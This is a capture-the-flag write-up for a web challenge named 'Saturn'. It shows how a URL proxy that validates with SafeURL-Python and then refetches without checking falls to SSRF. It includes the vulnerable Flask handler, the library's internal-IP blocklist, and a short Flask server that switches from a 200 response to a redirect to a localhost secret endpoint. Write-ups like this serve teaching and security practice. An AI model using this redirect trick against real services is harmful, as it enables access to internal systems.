---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Web: Saturn

The web is an redirection proxy app. You put there a URL and it will print its content on the webpage.

But let's check the code. There are two endpoints.

* `GET /` that renders the page
* `POST /` that handles the proxy request
* `GET /secret` secret that returns the flag

But there are some caveats and observations.

1. The secret endpoint is available only from localhost.

   ```
   f request.remote_addr == '127.0.0.1':
   ```
2. The proxy allows for redirect

   ```
   opt.enableFollowLocation().setFollowLocationLimit(0)
   ```

If we try simply requesting `http://localhost:1337/secret`, it will not work.

## Blacklist/Whitelist

The problem is that the used library `SafeURL-Python` have some blacklist/whitelist in default settings (which is applied). See: https://github.com/IncludeSecurity/safeurl-python/blob/main/safeurl/safeurl.py

```
"whitelist": {
	"ip": [],
	"port": ["80", "443", "8080"],
	"domain": [],
	"scheme": ["http", "https"]},
"blacklist": {
	"ip": ["0.0.0.0/8", "10.0.0.0/8", "100.64.0.0/10", "127.0.0.0/8", "169.254.0.0/16",
		"172.16.0.0/12", "192.0.0.0/29", "192.0.2.0/24", "192.88.99.0/24", "192.168.0.0/16",
		"198.18.0.0/15", "198.51.100.0/24", "203.0.113.0/24", "224.0.0.0/4", "240.0.0.0/4"],
	"port": [],
	"domain": [],
	"scheme": []}
```

Meaning, I cannot simply request `localhost`, or port `1337`. What's more, the same check is applied for redirects, so I can't just let it bubble through URL shortener. In this part, the library is solid.

## Vulnerablility

However, there is one vulnerability in the app.

```python
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        url = request.form['url']
        try:
            su = safeurl.SafeURL()
            opt = safeurl.Options()
            opt.enableFollowLocation().setFollowLocationLimit(0)
            su.setOptions(opt)
            su.execute(url)
        except:
            return render_template('index.html', error=f"{sys.exc_info()}")
        r = requests.get(url)
        return render_template('index.html', result=r.text)
    return render_template('index.html')
```

If you follow the lines you'll see that first, the URL is checked, which makes a request (`su.execute(url)`). And only then, if it is clear, the URL is requested again (`r = requests.get(url)`), now **without** check.

Which mean, I need to have a web server that responds 200, and then on a second request, it respond with 302, redirecting it back to localhost. Thus, making SSRF, accessing the hidden endpoint.

## Exploit

For that I create a simple Flask app.

```
from flask import Flask, redirect
 
app = Flask(__name__)
 
flip = True

@app.route('/')
def saturner():
    global flip
    flip = not flip
    match flip:
        case False:
            return 'Next request will redirect!'
        case True:
            return redirect('http://localhost:1337/secret')
 
if __name__ == '__main__':
    app.run(port=8080)
```

Now, to get a nice IP, I need to host it somewhere. Like: https://www.pythonanywhere.com/

Once hosted, I have it request my page and receive the flag. Nice!